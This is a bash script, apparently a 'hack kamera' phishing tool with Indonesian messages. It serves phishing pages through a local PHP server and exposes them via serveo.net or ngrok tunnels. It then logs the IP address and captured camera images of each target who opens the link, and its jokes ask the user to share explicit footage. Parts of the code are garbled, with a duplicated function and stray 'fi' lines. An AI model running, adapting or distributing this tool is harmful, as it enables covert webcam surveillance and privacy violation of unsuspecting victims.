#!/bin/bash
# •|NAMADISAMARKAN|•
# link github.com/TAMVANgithub/namadisamarkan
# script hack kamera

 trap 'printf "\n";stop' 2

 banner() {

 printf "\033[1;35m    ###################\n"
printf "\033[1;35m    $$$$$  $$$$$   $$  $$$$$\n"
printf "\033[1;35m    $$  $$  $$   $$   $$  $$  $$\n"
printf "\033[1;36m    $$$$$  $$  $$   $$  $$$$$ \n"
printf "\033[1;36m    $$ $$  $$   $$   $$  $$\n"
printf "\033[1;37m      Hack Kamera\033[1;36m»» |___/\n\n"
printf " \033[1;31m××××××××××××××××××\033[1;37m××××××××××××××××××\n"
printf " \033[1;32mWhatsapp : \033[1;33m089614269046\n"
printf " \033[1;31m××××××××××××××××××\033[1;37m××××××××××××××××××\n"
printf " \033[1;32mFacebook : \033[1;33marip saepudin P\n"
printf " \033[1;31m××××××××××××××××××\033[1;37m××××××××××××××××××\n"
printf " \033[1;32mhttps://github.com\033[1;33m/TAMVANgithub/namadisamarkan\n"
printf " \033[1;31m××××××××××××××××××\033[1;37m××××××××××××××××××\n"
printf " \n"

 }

 stop() {

 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

 if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

 }

 dependencies() {

fi

 if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
  
 }

 dependencies() {


 command -v php > /dev/null 2>&1 || { echo >&2 "anjir gmn mau bisa lu blm install php njir! install pkg install php"; exit 1; }


 }

 catch_ip() {

 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

 cat ip.txt >> saved.ip.txt


 }

 checkfound() {

 printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Menunggu Target,Gk sabar sebut nama gw 3 kali orang tamvan. canda?\e[0m\e[1;77m Klik Ctrl + C Untuk Keluar...\e[0m\n"
while [ true ]; do


 if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target Membuka Link!\n"
catch_ip
rm -rf ip.txt

 fi

 sleep 0.5

 if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Kamera Disimpan kawan jgn lupa klo ada vokep bagi²!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

 done 

 }


 server() {

 command -v ssh > /dev/null 2>&1 || { echo >&2 "njir gmn mau bisa lu blm install ssh njir! Install pkg install bash"; exit 1; }

 printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Menghubungkan Serveo Su...\e[0m\n"

 if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

 if [[ $subdomain_resp == true ]]; then

 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

 sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

 sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Menghubungkan php Server kawan... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Copy Link Ini zeyeng :\e[0m\e[1;77m %s\n' $send_link

 }


 payload_ngrok() {

 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' oxlynx.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


 }

 ngrok_server() {


 if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

 if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error asw... Termux, ketik:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

 else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

fi

 printf "\e[1;92m[\e[0m+\e[1;92m] Menghubuhgkan php Server kawan...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Menghubungkan ngrok Server kawan...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

 payload_ngrok
checkfound
}

 start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

 printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Pilih Yang Mana zeyeng😗? \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

 command -v php > /dev/null 2>&1 || { echo >&2 "njir gmn mau bisa lu blm install ssh njir! install pkg install ssh"; exit 1; }
start

 elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Hadeh!\e[0m\n"
sleep 1
clear
start1
fi

 }


 payload() {

 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

 sed 's+forwarding_link+'$send_link'+g' oxlynx.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


 }

 start() {

 default_choose_sub="Y"
default_subdomain="ORANGTAMVAN"

 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Default/terserah aku? (Ya/Gak\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Pilih Kata : (Opo\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

 server
payload
checkfound

 }

 banner
dependencies
start1
